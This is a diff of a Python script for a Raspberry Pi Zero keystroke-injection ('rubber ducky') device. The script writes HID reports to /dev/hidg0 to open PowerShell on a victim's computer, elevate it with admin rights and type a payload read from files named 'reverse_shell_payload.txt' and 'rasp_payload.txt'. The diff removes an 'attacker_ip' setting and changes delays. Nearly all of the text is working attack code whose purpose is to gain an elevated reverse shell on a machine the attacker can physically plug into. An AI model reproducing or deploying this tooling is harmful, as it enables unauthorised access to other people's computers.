@@ -5,7 +5,6 @@ def write_report(report):
     with open('/dev/hidg0', 'rb+') as fd:
         fd.write(report.encode())
 
-attacker_ip = '192.168.1.81'
 
 lib_lower = {
         'a': 4,
@@ -136,25 +135,25 @@ def open_cmd(ps):
         app = 'powershell'
     for i in app:
         print(i)
-        time.sleep(0.05)
+   #     time.sleep(0.05)
         send(i)
 
 
 def admin_enter():
-    time.sleep(0.5)
+   # time.sleep(0.5)
     # press control shift enter
     write_report(chr(48) + NULL_CHAR + chr(40) + NULL_CHAR*5)
-
     time.sleep(0.5)
  
 
 def windows_key():
     write_report(chr(8)+NULL_CHAR*7)
     write_report(NULL_CHAR*8)
-    time.sleep(0.5)
+   # time.sleep(0.5)
 
 
 def arrow_key(left):
+    time.sleep(0.5)
     if left is True:
         write_report(NULL_CHAR*2 + chr(80) + NULL_CHAR*5)
     else:
@@ -163,7 +162,7 @@ def arrow_key(left):
 
 
 def send_reverse_payload():
-    lines = open('/home/pi/raspberypi0rubberducky/reverse_shell_payload.txt', 'r')
+    lines = open('/home/pi/raspberypi0rubberducky/rasp_payload.txt', 'r')
     l = lines.readlines()
     print(l)
     for i in l[0]:
@@ -186,7 +185,6 @@ for l in lines:
     write_report(NULL_CHAR*8)
     time.sleep(0.5)
     l = l.rstrip("\n")
-
     line = l.split(" ")
     print(l)
     if line[0] == 'string':
